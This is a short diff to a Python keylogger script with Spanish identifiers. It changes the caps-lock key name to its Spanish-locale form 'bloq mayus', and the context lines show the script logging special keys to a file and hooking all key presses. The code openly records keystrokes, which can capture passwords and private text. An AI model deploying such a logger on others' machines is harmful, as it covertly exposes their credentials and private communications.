@@ -22,7 +22,7 @@ def teclasPresionadas(key):
                 file.write("[CTRL]")
             elif key.name == "alt":
                 file.write("[ALT]")
-            elif key.name == "caps lock":
+            elif key.name == "bloq mayus":
                 file.write("[CAPSLOCK]")
             elif key.name == "windows izquierda":
                 file.write("[WINDOWS]")
@@ -31,3 +31,4 @@ def teclasPresionadas(key):
 print(f"Keylogger iniciado. Registrando en: log_file")
 keyboard.on_press(teclasPresionadas)
 keyboard.wait()
+
